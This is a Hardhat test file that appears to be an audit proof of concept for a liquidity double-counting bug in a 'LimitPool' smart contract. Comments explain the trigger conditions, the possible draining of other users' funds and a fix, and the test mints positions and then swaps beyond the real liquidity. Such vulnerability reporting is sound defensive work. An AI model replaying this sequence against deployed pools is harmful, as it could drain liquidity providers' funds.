/* global describe it before ethers */
const hardhat = require('hardhat')
const { expect } = require('chai')
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { BigNumber } from 'ethers'
import { mintSigners20 } from '../utils/token'
import {
    BN_ZERO,
    PoolState,
    getLiquidity,
    getPositionLiquidity,
    getPrice,
    getSwapEpoch,
    getTick,
    getTickAtPrice,
    validateBurn,
    validateMint,
    validateSwap
} from '../utils/contracts/limitpool'
import { gBefore } from '../utils/hooks.test'

alice: SignerWithAddress
describe('LimitPool Tests', function () {
    let tokenAmount: string
    let tokenAmountBn: BigNumber
    let token0Decimals: number
    let token1Decimals: number
    let minPrice: BigNumber
    let maxPrice: BigNumber

    let alice: SignerWithAddress
    let bob: SignerWithAddress
    let carol: SignerWithAddress

    const liquidityAmount = BigNumber.from('20051041647900280328782')
    const minTickIdx = BigNumber.from('-887272')
    const maxTickIdx = BigNumber.from('887272')

    ////////// DEBUG FLAGS //////////
    let debugMode = false
    let balanceCheck = false
    let deltaMaxBeforeCheck = false
    let deltaMaxAfterCheck = false
    let latestTickCheck = false

    //every test should clear out all liquidity

    before(async function () {
        await gBefore()
        let currentBlock = await ethers.provider.getBlockNumber()
        const pool0: PoolState = await hre.props.limitPool.pool0()
        const liquidity = pool0.liquidity
        const globalState = await hre.props.limitPool.globalState()
        const price = pool0.price

        expect(liquidity).to.be.equal(BN_ZERO)

        minPrice = BigNumber.from('4297706460')
        maxPrice = BigNumber.from('1460570142285104104286607650833256105367815198570')
        token0Decimals = await hre.props.token0.decimals()
        token1Decimals = await hre.props.token1.decimals()
        tokenAmountBn = ethers.utils.parseUnits('100', token0Decimals)
        tokenAmount = ethers.utils.parseUnits('200', token0Decimals).toString()
        alice = hre.props.alice
        bob = hre.props.bob
        carol = hre.props.carol
    })

    this.beforeEach(async function () {
        await mintSigners20(hre.props.token0, tokenAmountBn.mul(10), [hre.props.alice, hre.props.bob])

        await mintSigners20(hre.props.token1, tokenAmountBn.mul(10), [hre.props.alice, hre.props.bob])
    })

    it.only('insertSingle double counts liquidity', async function () {
        const liquidityAmount = '20051041647900280328782'

        // Get pool price right on an even tick
        let pool0Tick = await getTickAtPrice(true);
        let pool1Tick = await getTickAtPrice(false);

        expect(pool0Tick).to.eq(0);
        expect(pool1Tick).to.eq(0);

        // Initial mint to get the pool.price to tick 0 with liquidity there
        await validateMint({
            signer: hre.props.bob,
            recipient: hre.props.bob.address,
            lower: '0',
            upper: '100',
            amount: tokenAmountBn,
            zeroForOne: true,
            balanceInDecrease: tokenAmountBn,
            liquidityIncrease: liquidityAmount,
            upperTickCleared: false,
            lowerTickCleared: true,
            revertMessage: '',
        })

        // Mint such that the lower is at the pool.price
        // Notice that the validation fails, as the liquidity is double counted
        // The pool.liquidity goes to liquidityAmount.mul(2), however the liquidityDelta for
        // tick 0 is incremented to liquidityAmount.
        // The validation is commented out atm to show the full effects of this bug.

        // This is because the pool.liquidity is not zeroed out, meanwhile the tick.liquidityDelta is still incremented
        // by the pool.liquidity when the following are satisfied:
        // * params.lower == tickToSave
        // * pool.price == roundedPrice
        // * tickToSave.priceAt == 0

        // The remediation is to ensure that whenever the liquidityDelta is updated on the tickToSave,
        // the pool.liquidity is zeroed out, every time.
        await validateMint({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            lower: '0',
            upper: '100',
            amount: tokenAmountBn,
            zeroForOne: true,
            balanceInDecrease: tokenAmountBn,
            liquidityIncrease: liquidityAmount,
            upperTickCleared: false,
            lowerTickCleared: true,
            revertMessage: '',
        })

        // Now this tick 0 can be crossed and it's liquidity delta can be added to the pool liquidity.
        // This is catastrophic as now the liquidity from other positions (far from the current price)
        // Can now be used to swap in the pool at the current price, and when these users attempt to burn
        // They will receive an ERC20 token balance underflow and experience a significant loss.

        // Mint a position to move down a tick so that the cross tick is tick 0 which has the extra liquidity
        await validateMint({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            lower: '-10',
            upper: '90',
            amount: tokenAmountBn,
            zeroForOne: true,
            balanceInDecrease: tokenAmountBn,
            liquidityIncrease: "20041019134030931248014",
            upperTickCleared: false,
            lowerTickCleared: true,
            revertMessage: '',
        })

        // ~ liquidityAmount * 3 has actually been added, however I can swap more than the token amount
        // that should be supported by the actual liquidity that has been added.
        //
        // In this scenario since there are no other positions away from the current price, this will result in
        // and ERC20 balance underflow. In a real life scenario this would drain funds from positions away from the
        // current price and result in significant losses for those users.
        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: false,
            amountIn: tokenAmountBn.mul(4),
            priceLimit: maxPrice,
            balanceInDecrease: '20000000000000000000',
            balanceOutIncrease: '19980070790195293837',
            revertMessage: 'ERC20: transfer amount exceeds balance',
        })

    })

});